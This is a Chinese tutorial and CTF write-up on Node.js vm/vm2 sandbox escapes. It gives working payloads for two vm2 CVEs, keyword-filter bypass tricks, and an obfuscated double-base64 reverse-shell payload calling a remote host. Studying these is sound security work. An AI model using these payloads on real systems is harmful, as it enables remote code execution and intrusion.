# nodejs VM和VM2沙箱逃逸

<!--more-->
参考：https://xz.aliyun.com/t/11859?time__1311=mqmx0DBD9DyDuBYD%2FQbiQQLcxA2%3D7YRieD&alichlgref=https%3A%2F%2Fwww.google.com%2F#toc-6

参考：https://www.anquanke.com/post/id/237032#h3-4

## 基础概念

### 一、

**1：**`JavaScript`和`Nodejs`之间区别：`JavaScript`用在浏览器前端，后来将Chrome中的v8引擎单独拿出来为JavaScript单独开发了一个运行环境，因此写在后端（服务端）的`JavaScript`就叫叫做`Nodejs`。

**2：**在Nodejs中，我们可以通过引入vm模块来创建一个“沙箱”，但其实这个vm模块的隔离功能并不完善，还有很多缺陷，因此Node后续升级了vm，也就是现在的vm2沙箱，vm2引用了vm模块的功能，并在其基础上做了一些优化。

### 二、

**nodejs作用域：**说到作用域，我们就要说一下`Node`中的作用域是怎么分配的（在`Node`中一般把作用域叫上下文）

![](https://pic.imgdb.cn/item/6602b6259f345e8d03d1b99a.png)
在JavaScript中`window`是全局对象，浏览器其他所有的属性都挂载在`window`下，那么在服务端的Nodejs中和`window`类似的全局对象叫做`global`，Nodejs下其他的所有属性和包都挂载在这个global对象下。在global下挂载了一些全局变量，我们在访问这些全局变量时不需要用`global.xxx`的方式来访问，直接用`xxx`就可以调用这个变量。举个例子，`console`就是挂载在global下的一个全局变量，我们在用`console.log`输出时并不需要写成`global.console.log`，其他常见全局变量还有process（一会逃逸要用到）

## VM沙箱逃逸

### 一、

关键函数：

* `vm.runinThisContext(code)`：在当前global下创建一个作用域（sandbox），并将接收到的参数当作代码运行。sandbox中可以访问到global中的属性，但无法访问其他包中的属性。

* `vm.createContext([sandbox])`： 在使用前需要先创建一个沙箱对象，再将沙箱对象传给该方法（如果没有则会生成一个空的沙箱对象），v8为这个沙箱对象在当前global外再创建一个作用域，此时这个沙箱对象就是这个作用域的全局对象，沙箱内部无法访问global中的属性。（类似于把global变为了其他包，V8引擎变为了全局）

* `vm.runInContext(code, contextifiedSandbox[, options])`：参数为要执行的代码和创建完作用域的沙箱对象，代码会在传入的沙箱对象的上下文（作用域）中执行，并且参数的值与沙箱内的参数值相同。

### 二、

#### 1：一般的VM沙箱逃逸

先看列子：

```js
const vm = require('vm');
const script = `m + n`;
//反引号可以执行命令
const sandbox = { m: 1, n: 2 };
//给沙箱中传入对象
const context = new vm.createContext(sandbox);
//创建沙箱上下文环境并将沙箱对象传递进来
const res = vm.runInContext(script, context);
//沙箱内部的执行
console.log(res)
```

执行:

![](https://pic.imgdb.cn/item/6602b6579f345e8d03d2e764.png)

这里命令是 \`m+n\` ，然后 context 是沙箱内的对象，如果对象改为 null 的话命令就执行不了了。

这种有对象的非常容易绕过 payload：

```js
const cc = this.toString.constructor('return process')()
#通过指向sandbox（全局）的this拿到了process模块，然后通过this.toString拿到了toString函数，最后通过constructor拿到了所有函数的构造函数Function，然后通过return process拿到process模块。
cc.mainModule.require('child_process').execSync('whoami').toString()
#拿到process模块后拿到子模块child_process，最后调用whoami命令执行的方法。
#execSync同步执行
```

传入：

![](https://pic.imgdb.cn/item/6602b67b9f345e8d03d3c9eb.png)

运行即可执行命令：

![](https://pic.imgdb.cn/item/6602b6909f345e8d03d45a1c.png)

如果我们将this换成m和n也是访问不到的，因为数字，字符串，布尔这些都是`primitive`类型，他们在传递的过程中是将值传递过去而不是引用（类似于函数传递形参），在沙盒内使用的mn已经不是原来的mn了，所以无法利用（如果换为其他类型，如字典，数组就可以引用了）。

#### 2：其他VM沙箱逃逸

******

示例1：

```js
const vm = require('vm');
const script = `...`;
const sandbox = Object.create(null);
const context = vm.createContext(sandbox);
const res = vm.runInContext(script, context);
console.log('Hello ' + res)
```

可以看到这里沙箱对象变为了`null`，没有可以引用的对象，所以`this`的方法无法使用了。

这时候想要逃逸我们要用到一个函数中的内置对象的属性`arguments.callee.caller`，它可以返回函数的调用者。

**原理：**

上面演示的沙箱逃逸其实就是找到一个沙箱外的对象，并调用其中的方法，这种情况下也是一样的，我们只要在沙箱内定义一个函数，然后在沙箱外调用这个函数，那么这个函数的`arguments.callee.caller`就会返回沙箱外的一个对象（返回函数调用者），我们在沙箱内就可以进行逃逸了。

**payload：**

```js
(() => {
    const a = {}
    a.toString = function () {
      const cc = arguments.callee.caller;
      const p = (cc.constructor.constructor('return process'))();
      return p.mainModule.require('child_process').execSync('whoami').toString()
    }
    return a
  })()
```

**分析：**

首先是创建了个箭头函数（为什么待会再说），再在函数里面创建了个对象a，给a对象创建了个toString方法（重写tostring方法）。重写的toString方法大概功能就是，给cc赋值为`arguments.callee.caller`获取的对象（类似于上面的this，就是获取个外部对对象），再拼接到p上，那么p的值就变为了`process`这个函数，再将p拼接到到最后，即可执行命令。（意思是可以直接全部拼接到一起）。最后箭头函数就是为了return  a这个对象（也就是执行结果）。

`arguments.callee.caller`之所以会返回个对像，是因为沙箱外console.log中通过字符串拼接的方式调用了这个重写后的toString函数，触发`arguments.callee.caller`函数功能。

******

示例2：

```js
const vm = require('vm');
const script = `...`;
const sandbox = Object.create(null);
const context = new vm.createContext(sandbox);
const res = vm.runInContext(script, context);
console.log(res.abc)
```

没有了字符串拼接，但打印结果为`res.abc`，可以用`Proxy`来劫持属性：

payload：

```js
(() =>{
    const a = new Proxy({}, {
        get: function(){
            const cc = arguments.callee.caller;
            const p = (cc.constructor.constructor('return process'))();
            return p.mainModule.require('child_process').execSync('whoami').toString();
        }
    })
    return a
})()
```

分析：

也是为了调用外部对象。触发利用链的逻辑就是我们在`get:`这个钩子里写了一个恶意函数，当我们在沙箱外访问proxy对象的任意属性（不论是否存在）这个钩子就会自动运行，实现了rce。

******

示例3：

```js
const vm = require('vm');
const script = `...`;
try {
    vm.runInContext(script, vm.createContext(Object.create(null)));
}catch(e) {
    console.log(e.message) 
}
```

payload；

```js
    throw new Proxy({}, {
        get: function(){
            const cc = arguments.callee.caller;
            const p = (cc.constructor.constructor('return process'))();
            return p.mainModule.require('child_process').execSync('whoami').toString();
        }
    })
```

结合了示例2，因为throw了个错误，直接到了catch模块，然后`console.log(e.message)`触发钩子`get:`。（原理都大差不差了）

******

## VM2沙箱逃逸

引用师傅们的基础

- `cli.js`实现了可以在命令行中调用vm2 也就是bin下的vm2。
- `contextify.js`封装了三个对象：`Contextify Decontextify propertyDescriptor`，并且针对global的Buffer类进行了代理。
- `main.js` 是vm2执行的入口，导出了`NodeVM VM`这两个沙箱环境，还有一个`VMScript`实际上是封装了`vm.Script`。
- `sandbox.js`针对global的一些函数和变量进行了拦截，比如`setTimeout，setInterval`等

vm2相比vm做出很大的改进，其中之一就是利用了es6新增的proxy特性，从而使用钩子拦截对`constructor`和`__proto__`这些属性的访问。

VM运行演示

```js
const {VM, VMScript} = require('vm2');

const script = new VMScript("let a = 2;a;");

console.log((new VM()).run(script));
```

`VM`是vm2在vm的基础上封装的一个虚拟机，我们只需要实例化后调用其中的run方法就可以运行一段脚本。

******

#### （CVE-2019-10761）

该漏洞要求vm2版本<=3.6.10

```js
const {VM} = require('vm2');
const untrusted = ``;
try{
    console.log(new VM().run(untrusted));
}catch(x){
    console.log(x);
}
```

payload:

```js
const f = Buffer.prototype.write;
const ft = {
        length: 10,
        utf8Write(){

        }
}
function r(i){
    var x = 0;
    try{
        x = r(i);
    }catch(e){}
    if(typeof(x)!=='number')
        return x;
    if(x!==i)
        return x+1;
    try{
        f.call(ft);
    }catch(e){
        return e;
    }
    return null;
}
var i=1;
while(1){
    try{
        i=r(i).constructor.constructor("return process")();
        break;
    }catch(x){
        i++;
    }
}
i.mainModule.require("child_process").execSync("whoami").toString()
```

继续引用：

这条链子获取沙箱外对象的方法是 在沙箱内不断递归一个函数，当递归次数超过当前环境的最大值时，我们正好调用沙箱外的函数，就会导致沙箱外的调用栈被爆掉，我们在沙箱内catch这个异常对象，就拿到了一个沙箱外的对象

举个例子：

假设当前环境下最大递归值为1000，我们通过程序控制递归999次（注意这里说的递归值不是一直调用同一个函数的最大值，而是单次程序内调用函数次数的最大值，也就是调用栈的最大值）：

```js
r(i);      // 该函数递归999次

f.call(ft);    // 递归到第1000次时调用f这个函数，f为Buffer.prototype.write，就是下面图片的这个函数

this.utf8Write()   // 递归到1001次时为该函数，是一个外部函数，所以爆栈时捕捉的异常也是沙箱外，从而返回了一个沙箱          外的异常对象
```

******

#### （CVE-2021-23449）

```js
const {VM} = require("vm2");
let vmInstance = new VM();
let code = 
vmInstance.run(code);
console.log(polluted);
```

payload1：

```js
  res = eval(&#39;import(\\&#39;./foo.js\\&#39;);&#39;)         res.__proto__.__proto__.polluted = res.__proto__.__proto__.toString.constructor(&quot;return this&quot;)().process.mainModule.require(&quot;child_process&quot;).execSync(&quot;touch HACKED&quot;).toString();
```

payload2：

```
 import('./foo.js')
res.toString.constructor("return this")().process.mainModule.require("child_process").execSync("whoami").toString();
```

payload3：

```js
Symbol = {
  get toStringTag(){
    throw f=>f.constructor("return process")()
  }
};
try{
  Buffer.from(new Map());
}catch(f){
  Symbol = {};
  f(()=>{}).mainModule.require("child_process").execSync("whoami").toString();
}
```

这个就看参考好了，解释不出来。

#### （[HFCTF2020]JustEscape）

```js
"use strict";
const {VM} = require('vm2');
const untrusted = '';
try{
	console.log(new VM().run(untrusted));
}catch(x){
	console.log(x);
}
```

paylaod:

```js
(function(){
	TypeError.prototype.get_process = f=>f.constructor("return process")();
	try{
		Object.preventExtensions(Buffer.from("")).a = 1;
	}catch(e){
		return e.get_process(()=>{}).mainModule.require("child_process").execSync("whoami").toString();
	}
})()
```

这道题有关键字waf，用模板字符串拼接可以绕过

最终payload;

```js
(function (){
    TypeError[`${`${`prototyp`}e`}`][`${`${`get_pro`}cess`}`] = f=>f[`${`${`constructo`}r`}`](`${`${`return proc`}ess`}`)();
    try{
        Object.preventExtensions(Buffer.from(``)).a = 1;
    }catch(e){
        return e[`${`${`get_pro`}cess`}`](()=>{}).mainModule[`${`${`requir`}e`}`](`${`${`child_proces`}s`}`)[`${`${`exe`}cSync`}`](`cat /flag`).toString();
    }
})()

```

## 关键字绕过

### 一、

nodejs命令执行

####  1：16进制编码

```js
require("child_process")["exe\x63Sync"]("whoami")
```

#### 2：unicode编码

```js
require("child_process")["exe\u0063Sync"]("whomai")
```

#### 3：加号拼接

```js
require('child_process')['exe'%2b'cSync']('whoami')
```

#### 4：模板字符串拼接

```js
require('child_process')${`${`exe`}cSync`}('curl 127.0.0.1:1234')
require('child_process')[`${`${`exe`}cSync`}`]('curl 127.0.0.1:1234')
//加不加中括号要取决于外面一层是否有反引号
```

#### 5：concat连接

```js
require("child_process")["exe".concat("cSync")]("curl 127.0.0.1:1234")
```

#### 6：base64编码

```js
eval(Buffer.from('Z2xvYmFsLnByb2Nlc3MubWFpbk1vZHVsZS5jb25zdHJ1Y3Rvci5fbG9hZCgiY2hpbGRfcHJvY2VzcyIpLmV4ZWNTeW5jKCJjdXJsIDEyNy4wLjAuMToxMjM0Iik=','base64').toString())
```

![](https://pic.imgdb.cn/item/6602b6c99f345e8d03d5f381.png)

### 二、

上面提到的几种方法，最终思路都是通过编码或者拼接得到关键字，这一块考虑js的一些语法和内置函数。

#### 1：Obejct.keys

```js
console.log(require('child_process').constructor===Object)
//true
Object.values(require('child_process'))[5]('curl 127.0.0.1:1234')
```

利用`Object.values`就可以拿到`child_process`中的各个函数方法，再通过数组下标就可以拿到`execSync`

连起来用就是

```js
require('child_process').constructor.values(require('child_process'))[5]('calc')
```

![](https://pic.imgdb.cn/item/6602b7389f345e8d03d88074.png)
#### 2：Reflect

```js
global[Reflect.ownKeys(global).find(x=>x.includes('eval'))]('global.process.mainModule.constructor._load("child_process").execSync("whoami")')
```

返回`Reflect.ownKeys(global)`所有函数，然后在所有函数中找到`eval`，这样拿到eval就不需要再去引入`process`模块了，eval里面就有

如果过滤了`eval`关键字，可以用`includes('eva')`来搜索`eval`函数，也可以用`startswith('eva')`来搜索

#### 3：**Reflect**.**get**

如果中括号被过滤了，

`Reflect.get(target, propertyKey[, receiver])`的作用是获取对象身上某个属性的值，类似于`target[name]`

```js
Reflect.get(global, Reflect.ownKeys(global).find(x=>x.includes('eva')))
等价于
global[Reflect.ownKeys(global).find(x=>x.includes('eva'))]
```

## NKCTF2024

### 世界上最简单的CTF

主要源码：

```js
const vm = require('vm');
const script= 
` `
const sandbox = Object.create(null);
const context = new vm.createContext(sandbox);
try {
    waf(script); // 调用 waf 函数对代码进行简单的安全检查
    let result = vm.runInContext(script, context); // 在沙盒环境中执行代码
    console.log(result); // 打印执行结果
} catch(e) {
    console.log(e.message); // 捕获可能的异常并打印错误消息
  //在出现异常时尝试引入名为 hack 的模块
}
 function waf(script) {
   let pattern = /(prcess|\[.*?\]|exc|spawn|Buffer|\+|concat|eval|Function)/g;
      if (script.match(pattern)) {
       throw new Error("what can I say? hacker out!!");
    }
    }
```

可以看到有catch模块，可以用VM沙盒逃逸的示例3。

但有waf需要绕过，（这里字符串拼接或编码的方式都不行，也就是关键字绕过的一模块，因为会在waf的上一步就会自动解析出来，可以在waf时打印内容看看，所以只能用js的语法来绕过）

paylaod1：

```js
throw new Proxy({}, {
        get: function(){
            const cc = arguments.callee.caller;
            const p = (cc.constructor.constructor('return global'))();
            const a = Reflect.get(p, Reflect.ownKeys(p).find(x=>x.includes('pro'))).mainModule.require(String.fromCharCode(99,104,105,108,100,95,112,114,111,99,101,115,115));
            return Reflect.get(a, Reflect.ownKeys(a).find(x=>x.includes('ex')))("calc");
        }
    })
```

用的Reflect绕过，

分析;

获取外部对象，拿到global，返回global全部函数，找到process，然后获得child_process，因为是字符串所以可以这样绕过（上面不是说了不能编码绕过吗？其实只要涉及到函数，就只有执行命令时才能解析出来。waf时解析是自动解析像无函数的编码，以及字符串拼接。那为什么不全这样绕过？这样只能绕过字符串，方法不能用这种方式绕过）。

payload2：

```js
throw new Proxy({}, {

  get: function(){

  const cc = arguments.callee.caller;

   const aa = 'return Process'.toLowerCase();

   const bb = 'child_pRocess'.toLowerCase();

   const p = (cc.constructor.constructor(aa))().mainModule.require(bb);

    return Reflect.get(Reflect.get(p, Reflect.ownKeys(p).find(x=>x.startsWith('ex')))('calc'));

  }
})
```

分析：

用的`toLowerCase()`函数（转小写）绕过了关键字字符串，然后用Reflect绕过方法。最后一句是个什么意思？

等于：

```js
[p[Reflect.ownKeys(p).find(x=>x.startsWith('ex'))]('calc')]
```

可见最外面一层中括号不要也行（后面试了也确实可以）：

![](https://pic.imgdb.cn/item/6602b6eb9f345e8d03d6cb85.png)

payload3：

```js
throw new Proxy({}, {
 	get: function(){
		const content = `;)"'}i-,hsab{|}d-,46esab{|}d-,46esab{|}9UkaKtSQElkMZpmTygzQORTRqxUeFpWT11EVOVXWE1Ee4M0YqJ1MMJjVHpldBlmSrE0UhRXQDFmeG1WW,ohce{' c- hsab"(cexe;)"ssecorp_dlihc"(eriuqer = } cexe { tsnoc`;
		const reversedContent = content.split('').reverse().join('');	
 		const c = arguments.callee.caller;
 		const p = (c.constructor.constructor(`${`${`return proces`}s`}`))();
 		p.mainModule.require('fs').writeFileSync('/tmp/test1.js', reversedContent);
        return p.mainModule.require(`${`${`child_proces`}s`}`).fork('/tmp/test1.js').toString();
	}
})
```

逆序内容：

```js
`const { exec } = require("child_process");exec("bash -c '{echo,WW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1EWXVOVE11TWpFeUxqRTROQzgyTmpZMklEQStKakU9}|{base64,-d}|{base64,-d}|{bash,-i}'");`
```

逆序+base64（但很神奇，这个模板字符串拼接竟然也行）

随便选一种都可以成功反弹shell：

![](https://pic.imgdb.cn/item/6602b75d9f345e8d03d96f5a.png)


